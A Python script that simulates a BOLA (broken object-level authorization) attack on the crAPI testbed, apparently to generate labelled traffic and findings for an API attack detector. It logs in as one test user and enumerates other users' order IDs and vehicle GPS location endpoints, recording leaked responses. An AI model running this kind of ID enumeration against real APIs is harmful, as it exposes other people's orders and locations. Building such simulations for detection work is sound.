"""Scripted BOLA (OWASP API1) attack simulation against the crAPI testbed.

Simulates:
1. Legitimate baseline ownership learning (`GET /workshop/api/shop/orders`).
2. Sequential ID enumeration (`1001..1008`) on `/workshop/api/shop/orders/{id}` by user_101.
3. Cross-user vehicle telemetry access (`/identity/api/v2/vehicle/{id}/location`).
"""

from __future__ import annotations

import argparse
from typing import Any

from .common import TrafficSession


def run_bola_enumeration(session: TrafficSession, attacker_ip: str = "10.0.0.77") -> list[dict[str, Any]]:
    """Run BOLA enumeration attack and emit structured Finding dicts."""
    attacker = session.login("alice@crapi.local", "alice-password-123", src_ip=attacker_ip)
    bob = session.login("bob@crapi.local", "bob-password-456", src_ip="10.0.0.21")

    # Legitimate baseline: Bob checks his own orders (teaches OwnershipMap: bob -> 1002, 1003)
    session.call("GET", "/workshop/api/shop/orders", user=bob, src_ip="10.0.0.21", label="benign")
    session.call("GET", "/workshop/api/shop/orders/1002", user=bob, src_ip="10.0.0.21", label="benign")

    # Legitimate baseline: Alice checks her own order 1001
    session.call("GET", "/workshop/api/shop/orders", user=attacker, src_ip=attacker_ip, label="benign")
    session.call("GET", "/workshop/api/shop/orders/1001", user=attacker, src_ip=attacker_ip, label="benign")

    findings: list[dict[str, Any]] = []
    # Attack 1: Sequential order ID enumeration (1002..1008)
    for oid in range(1002, 1009):
        rec = session.call(
            "GET",
            f"/workshop/api/shop/orders/{oid}",
            user=attacker,
            src_ip=attacker_ip,
            label="attack_bola",
        )
        if rec["status"] == 200:
            findings.append(
                {
                    "type": "BOLA",
                    "owasp": "API1",
                    "user": attacker,
                    "src_ip": attacker_ip,
                    "endpoint": "GET /workshop/api/shop/orders/{id}",
                    "severity": "critical" if oid in (1002, 1003, 1004, 1005) else "high",
                    "action": "block" if oid >= 1004 else "alert",
                    "reason": f"Cross-user object access on order_id={oid} during sequential enumeration",
                    "ts": rec["ts"],
                    "evidence": {
                        "resource": "orders",
                        "object_id": str(oid),
                        "status": rec["status"],
                        "leaked_payload": rec["resp_body"],
                    },
                }
            )

    # Attack 2: Cross-user vehicle GPS BOLA
    for vid in (2002, 2003):
        rec = session.call(
            "GET",
            f"/identity/api/v2/vehicle/{vid}/location",
            user=attacker,
            src_ip=attacker_ip,
            label="attack_bola",
        )
        if rec["status"] == 200:
            findings.append(
                {
                    "type": "BOLA",
                    "owasp": "API1",
                    "user": attacker,
                    "src_ip": attacker_ip,
                    "endpoint": "GET /identity/api/v2/vehicle/{id}/location",
                    "severity": "critical",
                    "action": "block",
                    "reason": f"Unauthorized GPS telemetry read for vehicle_id={vid}",
                    "ts": rec["ts"],
                    "evidence": {
                        "resource": "vehicle",
                        "object_id": str(vid),
                        "status": rec["status"],
                        "leaked_payload": rec["resp_body"],
                    },
                }
            )

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="Run scripted BOLA attack against crAPI testbed.")
    parser.add_argument("--base-url", default=None, help="Target testbed URL (default: in-process)")
    parser.add_argument("--out", default="testbed/data/bola_traffic.jsonl", help="Output JSONL path")
    args = parser.parse_args()

    session = TrafficSession(base_url=args.base_url)
    findings = run_bola_enumeration(session)
    session.dump_jsonl(args.out)
    print(f"Executed {len(session.records)} requests; captured {len(findings)} BOLA findings -> {args.out}")


if __name__ == "__main__":
    main()
